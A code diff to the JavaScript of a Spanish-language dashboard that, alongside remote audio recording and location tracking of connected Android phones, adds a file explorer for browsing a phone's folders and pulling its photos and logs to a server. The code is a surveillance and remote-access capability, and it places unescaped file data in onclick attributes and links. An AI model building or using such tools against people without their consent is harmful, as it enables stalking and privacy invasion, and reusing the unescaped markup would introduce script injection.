@@ -27,14 +27,37 @@ const btnCancelRecording = document.getElementById('btn-cancel-recording');
 // Tabs & Containers
 const tabBtnRecordings = document.getElementById('tab-btn-recordings');
 const tabBtnLocations = document.getElementById('tab-btn-locations');
+const tabBtnFiles = document.getElementById('tab-btn-files');
 const tabRecordings = document.getElementById('tab-recordings');
 const tabLocations = document.getElementById('tab-locations');
+const tabFiles = document.getElementById('tab-files');
 const recordingsTableContainer = document.getElementById('recordings-table-container');
 const locationsTableContainer = document.getElementById('locations-table-container');
 const recordingsCountBadge = document.getElementById('recordings-count-badge');
 const locationsCountBadge = document.getElementById('locations-count-badge');
+const storedFilesCountBadge = document.getElementById('stored-files-count-badge');
 const btnRefreshList = document.getElementById('btn-refresh-list');
 const toastContainer = document.getElementById('toast-container');
+
+// File Manager Elements
+const fmCurrentPath = document.getElementById('fm-current-path');
+const btnFmGo = document.getElementById('btn-fm-go');
+const btnFmUp = document.getElementById('btn-fm-up');
+const btnFmRefresh = document.getElementById('btn-fm-refresh');
+const fmTreeContainer = document.getElementById('fm-tree-container');
+const fmLoadingIndicator = document.getElementById('fm-loading-indicator');
+const storedFilesContainer = document.getElementById('stored-files-container');
+const btnRefreshStoredFiles = document.getElementById('btn-refresh-stored-files');
+const shortcutButtons = document.querySelectorAll('.btn-shortcut');
+
+// Modal Elements
+const filePreviewModal = document.getElementById('file-preview-modal');
+const modalFilename = document.getElementById('modal-filename');
+const modalFilemeta = document.getElementById('modal-filemeta');
+const modalDownloadBtn = document.getElementById('modal-download-btn');
+const modalCloseBtn = document.getElementById('modal-close-btn');
+const modalBodyContent = document.getElementById('modal-body-content');
+const modalTypeIcon = document.getElementById('modal-type-icon');
 
 // Floating Player Elements
 const floatingPlayer = document.getElementById('floating-player');
@@ -136,7 +159,29 @@ function handleServerMessage(data) {
       fetchLocations();
       break;
 
+    case 'FILE_LIST_RECEIVED':
+      fmLoadingIndicator.classList.add('hidden');
+      renderLiveFileList(data.path, data.files || []);
+      break;
+
+    case 'FILE_TRANSFER_STARTED':
+      showToast(`📥 Transfiriendo archivo desde el teléfono: ${data.filePath?.split('/')?.pop() || 'archivo'}...`, 'info');
+      break;
+
+    case 'REMOTE_FILE_UPLOADED':
+      showToast(`✅ Archivo recibido con éxito: ${data.file?.originalName || 'archivo'}`, 'success');
+      fetchStoredFiles();
+      if (data.file) {
+        openFilePreview(data.file);
+      }
+      break;
+
+    case 'REMOTE_FILE_DELETED':
+      fetchStoredFiles();
+      break;
+
     case 'ERROR':
+      fmLoadingIndicator.classList.add('hidden');
       alert(`⚠️ ${data.message}`);
       break;
   }
@@ -322,19 +367,23 @@ function updateRecordingProgress(elapsedSeconds, totalSeconds) {
 }
 
 // Tab Switching
-tabBtnRecordings.addEventListener('click', () => {
-  tabBtnRecordings.classList.add('active');
-  tabBtnLocations.classList.remove('active');
-  tabRecordings.classList.remove('hidden');
-  tabLocations.classList.add('hidden');
-});
+function switchTab(activeTabId) {
+  tabBtnRecordings.classList.toggle('active', activeTabId === 'tab-recordings');
+  tabBtnLocations.classList.toggle('active', activeTabId === 'tab-locations');
+  tabBtnFiles.classList.toggle('active', activeTabId === 'tab-files');
 
-tabBtnLocations.addEventListener('click', () => {
-  tabBtnLocations.classList.add('active');
-  tabBtnRecordings.classList.remove('active');
-  tabLocations.classList.remove('hidden');
-  tabRecordings.classList.add('hidden');
-});
+  tabRecordings.classList.toggle('hidden', activeTabId !== 'tab-recordings');
+  tabLocations.classList.toggle('hidden', activeTabId !== 'tab-locations');
+  tabFiles.classList.toggle('hidden', activeTabId !== 'tab-files');
+
+  if (activeTabId === 'tab-files') {
+    fetchStoredFiles();
+  }
+}
+
+tabBtnRecordings.addEventListener('click', () => switchTab('tab-recordings'));
+tabBtnLocations.addEventListener('click', () => switchTab('tab-locations'));
+tabBtnFiles.addEventListener('click', () => switchTab('tab-files'));
 
 // Fetch and Render Audio Recordings
 async function fetchRecordings() {
@@ -599,7 +648,314 @@ playerCloseBtn.addEventListener('click', () => {
 btnRefreshList.addEventListener('click', () => {
   fetchRecordings();
   fetchLocations();
+  fetchStoredFiles();
 });
+
+// ==========================================================================
+// Remote File Explorer Logic
+// ==========================================================================
+
+// Request live folder list from connected Android device
+function requestLiveFileList(path) {
+  if (currentDevices.length === 0) {
+    alert('No hay ningún teléfono conectado para consultar archivos.');
+    return;
+  }
+
+  fmLoadingIndicator.classList.remove('hidden');
+  fmTreeContainer.innerHTML = `
+    <div class="empty-state">
+      <div class="pulsing-spinner"></div>
+      <p>Cargando lista de archivos desde el teléfono...</p>
+    </div>
+  `;
+
+  if (socket && socket.readyState === WebSocket.OPEN) {
+    socket.send(JSON.stringify({
+      action: 'list_files',
+      deviceId: currentDevices[0]?.id,
+      path: path || ''
+    }));
+  }
+}
+
+// Request phone to transfer a specific file to the server
+function requestFileTransfer(filePath) {
+  if (currentDevices.length === 0) {
+    alert('No hay dispositivo conectado para transferir el archivo.');
+    return;
+  }
+
+  showToast(`Solicitando "${filePath.split('/').pop()}" al dispositivo...`, 'info');
+
+  if (socket && socket.readyState === WebSocket.OPEN) {
+    socket.send(JSON.stringify({
+      action: 'fetch_file',
+      deviceId: currentDevices[0]?.id,
+      filePath: filePath
+    }));
+  }
+}
+
+// Render Live Directory Items from Phone
+function renderLiveFileList(currentPath, files) {
+  fmCurrentPath.value = currentPath || '';
+
+  if (!files || files.length === 0) {
+    fmTreeContainer.innerHTML = `
+      <div class="empty-state">
+        <p>Carpeta vacía o sin archivos accesibles en esta ruta.</p>
+        <small>Ruta: ${escapeHtml(currentPath)}</small>
+      </div>
+    `;
+    return;
+  }
+
+  let html = '';
+  files.forEach(f => {
+    const isDir = f.isDirectory;
+    const icon = isDir ? '📁' : getFileIcon(f.name);
+    const sizeStr = isDir ? 'Carpeta' : formatBytes(f.size || 0);
+    const dateStr = f.lastModified ? new Date(f.lastModified).toLocaleString('es-ES') : '';
+
+    html += `
+      <div class="fm-item-row">
+        <div class="fm-item-left">
+          <span class="fm-item-icon">${icon}</span>
+          <div class="fm-item-info">
+            <div class="fm-item-name ${isDir ? 'dir-name' : ''}" 
+                 onclick="${isDir ? `browseToPath('${escapeJsString(f.path)}')` : ''}"
+                 title="${escapeHtml(f.path)}">
+              ${escapeHtml(f.name)}
+            </div>
+            <div class="fm-item-meta">${sizeStr} • ${dateStr}</div>
+          </div>
+        </div>
+        <div class="fm-item-actions">
+          ${isDir ? `
+            <button class="btn btn-secondary-sm" onclick="browseToPath('${escapeJsString(f.path)}')">Abrir ➔</button>
+          ` : `
+            <button class="btn btn-fetch-file" onclick="requestFileTransfer('${escapeJsString(f.path)}')">
+              📥 Solicitar y Ver
+            </button>
+          `}
+        </div>
+      </div>
+    `;
+  });
+
+  fmTreeContainer.innerHTML = html;
+}
+
+window.browseToPath = function(path) {
+  fmCurrentPath.value = path;
+  requestLiveFileList(path);
+};
+
+// Path navigation buttons
+btnFmGo.addEventListener('click', () => {
+  requestLiveFileList(fmCurrentPath.value.trim());
+});
+
+fmCurrentPath.addEventListener('keydown', (e) => {
+  if (e.key === 'Enter') {
+    requestLiveFileList(fmCurrentPath.value.trim());
+  }
+});
+
+btnFmRefresh.addEventListener('click', () => {
+  requestLiveFileList(fmCurrentPath.value.trim());
+});
+
+btnFmUp.addEventListener('click', () => {
+  let cur = fmCurrentPath.value.trim();
+  if (cur === 'camera' || cur === 'logs' || cur === 'internal' || cur === 'root' || cur === '/' || cur === '/sdcard') {
+    requestLiveFileList('internal');
+    return;
+  }
+  const parts = cur.replace(/\/$/, '').split('/');
+  if (parts.length > 1) {
+    parts.pop();
+    const upPath = parts.join('/') || '/';
+    fmCurrentPath.value = upPath;
+    requestLiveFileList(upPath);
+  }
+});
+
+shortcutButtons.forEach(btn => {
+  btn.addEventListener('click', () => {
+    const p = btn.getAttribute('data-path');
+    fmCurrentPath.value = p;
+    requestLiveFileList(p);
+  });
+});
+
+// ==========================================================================
+// Stored / Downloaded Files on Server Logic
+// ==========================================================================
+
+async function fetchStoredFiles() {
+  try {
+    const res = await fetch('/api/files/stored');
+    const files = await res.json();
+    renderStoredFiles(files);
+  } catch (err) {
+    console.error('Error fetching stored files:', err);
+  }
+}
+
+function renderStoredFiles(files) {
+  storedFilesCountBadge.textContent = files.length;
+
+  if (files.length === 0) {
+    storedFilesContainer.innerHTML = `
+      <div class="empty-state-sm">
+        <p>Aún no hay archivos descargados en el servidor.</p>
+        <small>Navega en las carpetas arriba y haz clic en "📥 Solicitar y Ver" para descargar fotos de la cámara o logs.</small>
+      </div>
+    `;
+    return;
+  }
+
+  let html = '';
+  files.forEach(f => {
+    const isImage = f.isImage || /\.(jpg|jpeg|png|webp|gif)$/i.test(f.filename);
+    const icon = isImage ? '🖼️' : getFileIcon(f.originalName);
+    const sizeStr = formatBytes(f.size || 0);
+    const dateStr = f.createdAt ? new Date(f.createdAt).toLocaleString('es-ES') : '';
+
+    html += `
+      <div class="fm-item-row">
+        <div class="fm-item-left">
+          <span class="fm-item-icon">${icon}</span>
+          <div class="fm-item-info">
+            <div class="fm-item-name" title="${escapeHtml(f.originalName)}">
+              ${escapeHtml(f.originalName)}
+            </div>
+            <div class="fm-item-meta">${sizeStr} • ${dateStr} • Dispositivo: ${escapeHtml(f.deviceName || 'Android')}</div>
+          </div>
+        </div>
+        <div class="fm-item-actions">
+          <button class="btn btn-secondary-sm" onclick='openFilePreview(${JSON.stringify(f)})'>
+            👁️ Ver
+          </button>
+          <a href="/api/files/download/${f.filename}" download="${f.originalName}" class="btn btn-icon-sm" title="Descargar archivo">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/>
+              <polyline points="7 10 12 15 17 10"/>
+              <line x1="12" y1="15" x2="12" y2="3"/>
+            </svg>
+          </a>
+          <button class="btn btn-delete-item" onclick="deleteStoredFile('${f.id}')" title="Eliminar archivo del servidor">
+            <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
+              <polyline points="3 6 5 6 21 6"/>
+              <path d="M19 6v14a2 2 0 0 1-2 2H7a2 2 0 0 1-2-2V6m3 0V4a2 2 0 0 1 2-2h4a2 2 0 0 1 2 2v2"/>
+            </svg>
+          </button>
+        </div>
+      </div>
+    `;
+  });
+
+  storedFilesContainer.innerHTML = html;
+}
+
+btnRefreshStoredFiles.addEventListener('click', fetchStoredFiles);
+
+window.deleteStoredFile = async function(id) {
+  if (!confirm('¿Deseas eliminar este archivo descargado del servidor?')) return;
+
+  try {
+    const res = await fetch(`/api/files/${id}`, { method: 'DELETE' });
+    if (res.ok) {
+      fetchStoredFiles();
+    }
+  } catch (err) {
+    alert('Error al eliminar el archivo');
+  }
+};
+
+// ==========================================================================
+// Preview Modal for Remote Photos & Logs
+// ==========================================================================
+
+window.openFilePreview = async function(file) {
+  modalFilename.textContent = file.originalName || file.filename;
+  const sizeStr = formatBytes(file.size || 0);
+  modalFilemeta.textContent = `${sizeStr} • Dispositivo: ${file.deviceName || 'Android'} • ${file.remotePath || ''}`;
+  modalDownloadBtn.href = `/api/files/download/${file.filename}`;
+  modalDownloadBtn.download = file.originalName || file.filename;
+
+  const isImage = file.isImage || /\.(jpg|jpeg|png|webp|gif|bmp)$/i.test(file.filename || file.originalName);
+  const isAudio = /\.(m4a|mp3|wav|ogg|aac|3gp)$/i.test(file.filename || file.originalName);
+
+  if (isImage) {
+    modalTypeIcon.textContent = '🖼️';
+    modalBodyContent.innerHTML = `
+      <img src="/api/files/view/${file.filename}" alt="${escapeHtml(file.originalName)}" class="modal-preview-img" />
+    `;
+    filePreviewModal.classList.remove('hidden');
+  } else if (isAudio) {
+    modalTypeIcon.textContent = '🎵';
+    modalBodyContent.innerHTML = `
+      <audio controls autoplay src="/api/files/view/${file.filename}" style="width: 100%; max-width: 500px;"></audio>
+    `;
+    filePreviewModal.classList.remove('hidden');
+  } else {
+    // Treat as text / log / config
+    modalTypeIcon.textContent = '📋';
+    modalBodyContent.innerHTML = `<div class="pulsing-spinner"></div><p style="color:var(--text-dim);">Cargando contenido del archivo...</p>`;
+    filePreviewModal.classList.remove('hidden');
+
+    try {
+      const res = await fetch(`/api/files/view/${file.filename}`);
+      const text = await res.text();
+      modalBodyContent.innerHTML = `
+        <pre class="modal-preview-text"><code>${escapeHtml(text)}</code></pre>
+      `;
+    } catch (err) {
+      modalBodyContent.innerHTML = `<p style="color: #ef4444;">Error al cargar vista previa del texto.</p>`;
+    }
+  }
+};
+
+modalCloseBtn.addEventListener('click', () => {
+  filePreviewModal.classList.add('hidden');
+  modalBodyContent.innerHTML = '';
+});
+
+filePreviewModal.addEventListener('click', (e) => {
+  if (e.target === filePreviewModal) {
+    filePreviewModal.classList.add('hidden');
+    modalBodyContent.innerHTML = '';
+  }
+});
+
+// Format utilities
+function getFileIcon(name) {
+  if (!name) return '📄';
+  const ext = name.split('.').pop().toLowerCase();
+  if (['jpg', 'jpeg', 'png', 'webp', 'gif', 'bmp'].includes(ext)) return '🖼️';
+  if (['log', 'txt', 'json', 'xml', 'md'].includes(ext)) return '📋';
+  if (['m4a', 'mp3', 'wav', 'ogg', 'aac'].includes(ext)) return '🎵';
+  if (['mp4', 'mkv', 'avi', 'mov'].includes(ext)) return '🎬';
+  if (['zip', 'rar', 'tar', 'gz'].includes(ext)) return '📦';
+  if (['pdf'].includes(ext)) return '📑';
+  return '📄';
+}
+
+function formatBytes(bytes) {
+  if (bytes === 0) return '0 B';
+  const k = 1024;
+  const sizes = ['B', 'KB', 'MB', 'GB'];
+  const i = Math.floor(Math.log(bytes) / Math.log(k));
+  return parseFloat((bytes / Math.pow(k, i)).toFixed(1)) + ' ' + sizes[i];
+}
+
+function escapeJsString(str) {
+  if (!str) return '';
+  return str.replace(/\\/g, '\\\\').replace(/'/g, "\\'");
+}
 
 function showToast(message, type = 'info') {
   if (!toastContainer) return;
@@ -630,3 +986,4 @@ function escapeHtml(str) {
 connectWebSocket();
 fetchRecordings();
 fetchLocations();
+fetchStoredFiles();
